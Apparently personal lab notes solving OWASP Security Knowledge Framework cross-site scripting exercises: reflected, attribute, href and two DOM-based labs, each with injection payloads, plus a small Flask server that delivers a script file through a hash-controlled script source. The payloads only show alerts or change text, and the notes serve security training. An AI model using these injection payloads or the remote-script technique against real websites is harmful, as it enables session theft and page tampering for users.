# Simple XSS
## [link](https://skf.gitbook.io/asvs-write-ups/cross-site-scripting-xss/cross-site-scripting)

- ![[xss-skf1.png]]
- The application shows an input field box
- When we look at the source, we see that our input is inside a tag
- ![[xss-skf2.png]]
- we can add Optional code inject
```html
<img src=x onerror=alert(origin)>
foobar"><script>alert(123)</script>
```
- ![[xss-skf3.png]]
- ![[xss-skf4.png]]


# XSS-Attribute
-  The program takes an input and performs a task (change color).
- ![[xss-skf5.png]]
- ![[xss-skf6.png]]
- OK we how can inject?
- we should break and fix 
```html
blue;'><img src=x onerror=alert(2)>
blue ' onmouseover='alert("XSS-Attribute")'
```
- ![[xss-skf7.png]]
- ![[xss-skf8.png]]

# XSS herf
- The application invites you to fill a website in the input box, that will be used from the "visit my website!" link to redirect to it.
- ![[xss-skf9.png]]
- ![[xss-skf10.png]]
- The next step is to see if we could include JavaScript that can be executed in the `href` attribute.
- <span style="color:rgb(0, 176, 80)">href="javascript:JS PAYLOAD"</span>
```html 
javascript:alert('XSS')
javascript:console.log('XSS')
```
- and when click on  `visit my website` js  code run
- ![[xss-skf11.png]]
- ![[xss-skf12.png]]


# XSS DOM
- The application shows an input field box
- ![[xss-skf13.png]]
- when we insert `salar` what happening?
- running this code
```js
function submit() {
			value = $("#input").val();
			console.log(value);
			$('#dom').html(value);
		}
```
- this code give value from input and change tag that has an ID=''dom"
- payload
```html
salar"><img src=x onerror=alert(1)>
salar"><script>alert(1)</script>
```
- ![[xss-skf15.png]]


# XSS DOM 2
- The application shows no input field or anything else we can interact with. Let's inspect the source code.
- ![[xss-skf16.png]]
```js
function loadWelcomeMessage() {
        setTimeout(function () {
          endpoint = location.hash.slice(5);
          var script = document.createElement("script");
          if (endpoint) {
            script.src = endpoint + "/static/js/welcome.js";
          } else {
            script.src = "/static/js/welcome.js";
          }
          document.head.appendChild(script);
        }, 2000);
      }
```
- We notice the application imports javascript files into the application using this function.

```javascript
endpoint = location.hash.slice(5);
```

Declaring endpoint variable which takes the url, whatever is after the hash(#) and using slice to remove the first 4 characters after that. If the endpoint exists it will load the js file from there.
## Exploitation
We can start building our malicious server and server the application with our malicious js file.

```py
from flask import Flask

app = Flask(__name__, static_url_path='/static', static_folder='static')
app.config['DEBUG'] = True

@app.route("/<path:path>")
def static_file(path):
    return app.send_static_file(path)

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=1337)
```
Now we need to create our malicous js file, save the following snippet code into /static/js/welcome.js

```js
document.getElementsByClassName("panel-body")[0].innerText = "salam conyy ha";
```
Now we can serve our malicious js file to the application

```http
http://0.0.0.0:5000/#xxxxhttp://0.0.0.0:1337
```
- ![[xss-skf17.png]]
- 